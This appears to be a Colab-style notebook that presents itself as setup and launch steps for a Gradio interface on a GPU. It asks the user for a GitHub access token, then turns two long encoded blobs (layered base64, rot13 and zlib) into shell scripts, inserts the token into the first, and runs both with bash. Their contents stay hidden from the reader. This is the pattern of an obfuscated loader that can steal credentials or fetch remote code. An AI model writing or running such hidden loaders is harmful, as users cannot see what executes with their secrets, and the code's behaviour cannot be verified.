# %%
# ── Verify T4 GPU is attached ────────────────────────────
# !nvidia-smi

# %%
# ╔══════════════════════════════════════════════════════════════════╗
# ║  STEP 1 — Setup & Install  (run once, ~3 min)                   ║
# ╚══════════════════════════════════════════════════════════════════╝

import base64, codecs, zlib, os
from getpass import getpass

print("Enter your GitHub fine-grained PAT (or press Enter if repo is public).")
_tok = getpass("Token: ").strip()

_p = (
    "ckFlcUl4MWkyMExEaXNBS0dPdHdidFhZZUJrcDZ4TWdJSWdCd05kSlZBZmJOZ2YxSWhFVjNXY25vYW5L"
    "eWJGekVLY2JHbTBJQ2VNL21lK3hmbEcxNkR1QnIzVnZSUFAxQm1mN28vb0F6MzM2V1p2MFBpY3BPUHVo"
    "Ylo5MDdRdUM0cjcyQ0cwRFdkeU5yTkxiUVBkRFhpMFdEMUFCQ2dlVTZvSjZhbmlpenZyZ3V1Zm9WL0ly"
    "Uk5sNXZvQitVNm53VlRNblpVQ1FNR1FWQVIrU0czQmgwMmkrcFVLbitvNTEzVVFtMTFKMzNxa2lpcjYw"
    "UTFiOTFteWJhTWoyM1BPWlhEL1BPQkFIS0ppV0RhRHF1ai90VVRiRWhTaUpYWnY5anJJS0xUVkhRZ05D"
    "am10UzkvbWIrWU9tUEcySFhvT1JWTGh6RUtud29xUUtLUmJodWU3aWhqNHpUaUExdUpBT3docmtlR2Qr"
    "NTNscy9XUm9UT0FMWkJ4MVBpTnpBRW5UZFVIZy8xL0FnNXRnQ2hoMTY0ZkhlSWVob3MwODMvbktvazla"
    "MzhqeU9zMFJuWEV4d2VneTkzUVk1WXZqOC9KbSt1ZFBybHVKNDROTzQ0eUF4eVNHdmwxeXpMeTNJelBI"
    "SFVMSkhOZHcvanl1UjRscU8yUmZiWXRva2g5aHMzaXhtNm9WNHI2c0NqVTIyNTN3U3VqMnc5ZGdOL09y"
    "c1lTb3VvaTNnM1BuYTVFUkFyWW5XdUdieXJTYXpWRVFDdFNneFJ2MjBER2RDdmtrR25aa2tTZnE1VG1K"
    "cENzVUs0TkVaSmhuTWRiYjBmMmhxaWtwWlFEM2RNY1BIRW41dTQ1VmNkTmtmSmRmZVJIK2xkV2JROW9X"
    "aXFhN2V0L3ErTVJJVWlMWXRGaSs5UnZ4bnZhZ2dBYVNQazlCMlYzZ1JOZFVYU05rdDlmdFRySFZPVjRZ"
    "c0FmMEpJQk0rWG00WlhSd2VYOFpRN3ZtOXd6SzhhZm5xNWxKK3psZWMxRDJ6c0hHVXVuWGY2V2k5OEVi"
    "M2c4K0h5d20wZjA3UTlzSGtDeEFhTVd5eXcwSExQVmQybWhRSTlsOG1pZURvTTZobHJmbjNPVnNpcnVr"
    "anlhbXA1cWhRY1hNWlZNS3Z4SDh1TEV5VmJsOVhiVFRHUENielB5ZmFYYlpqSUM0QWhaWFZrdnh2aXZL"
    "ZlU3MUMxamphVW9tR3JyWnJpQk5oYVNPK1BRd0J4dEwxTXNFRExEUXl2S1R5MEV2bGhCRHZ0SWRvOFNx"
    "RVRPbUpRdmtKbkRTQTRVVnh6RUdOMThYc3FvVHA2dExZc3FoR0t1ZFVQZG50ZWFqRi90S2FpLzhiZmNT"
    "SzZJd3dMZHo1d0MxdXFnZ0pTdFpYazhCUWc2OXQ0ZzhWbXgxcEZjMmJETGlLMW42bzFkcWo0ZVFFbVdJ"
    "SXVxZldNYjQ0SzFVRHpDMjdLc2M3SzFSaWRkQklkU3E1MWhMSWpMYWtkZjZXSXRuSSt3ZWVCL3lMbndY"
    "TmhyUzU1My9KWTE4L2YwUG56STdvaUhONUFYRnFhTWJZMytmaFpTdjYzV3dUeUlwVFQ5MlVnMGxhYkth"
    "bmFVL0pHZXVkY0FhV3ZzZWFYT3BuWlpieUVTWFNPVFh4WEErN1Fxb0YvdElBdTRJVlhrOGVCUWpHUmx5"
    "b2d0MXNzKzZQbEFyM2lqeHkzQ3RJTkwxT0pLNXdubWQrMk12MXgxRlZGbkFFZzJpcythSzg3eVpZUWhM"
    "NXRueFY0bkNwVzJ2dWNZL1ZLK3lySjBiWjhyTUtNdCthSTRqaGtROS9HaU5QTWNaTndJNnpuUU9XbEdm"
    "TDdQZGhiOFJxOXNkS3BTWGRsTWpxaEUvRnd3L09GLzIzajg9"
)

_s = base64.b64decode(_p.encode("ascii"))
_s = codecs.decode(_s.decode("ascii"), "rot_13")
_s = base64.b64decode(_s.encode("ascii"))
_s = zlib.decompress(_s).decode("utf-8")
_s = _s.replace("TOKEN_PLACEHOLDER", _tok)

_sh = "/tmp/_setup.sh"
with open(_sh, "w") as _f:
    _f.write(_s)
os.chmod(_sh, 0o755)

get_ipython().system(f"bash {_sh}")

# %%
# ╔══════════════════════════════════════════════════════════════════╗
# ║  STEP 2 — Launch UI  (run after setup, re-run to restart)       ║
# ║  Wait for the  gradio.live  link printed below, then open it.   ║
# ╚══════════════════════════════════════════════════════════════════╝

import base64, codecs, zlib, os

_p = (
    "ckFlSUh3U0JPUVJaN0NCWDRudzM4dDZ4ZDVQaEQwWU1rWXlSZUJrSTRobGwzc1RVZDJ3NDI3Mk5Xa054"
    "RFFqT1lSZmhNd0RudzMxN0wxZmdxZmtmdkVyWmV2b3dONmpLSXpYMWQ1RmFCd2dDa2NPQ3RnM2huMTRp"
    "WTMrOGk1M3YvcjMxUU9rcEw1OGxhM1A4ai9JOGpyZUhXMERjMFJENFNFcmw3WHI4UlY3M080ajBsc2Rz"
    "eWMwM0dwWFYvSW5rMUZsOGFtckhrYXRqNlFIWjlSbCtuRHJUaHB2Rk41SFgzNFk3Vm9EOEdUNkdjdUpP"
    "YnpoRy9iTCtDbFUyR1dQNWR6QTk3QWNaa0tqTjl6cGRDRD09"
)

_s = base64.b64decode(_p.encode("ascii"))
_s = codecs.decode(_s.decode("ascii"), "rot_13")
_s = base64.b64decode(_s.encode("ascii"))
_s = zlib.decompress(_s).decode("utf-8")

_sh = "/tmp/_launch.sh"
with open(_sh, "w") as _f:
    _f.write(_s)
os.chmod(_sh, 0o755)

get_ipython().system(f"bash {_sh}")
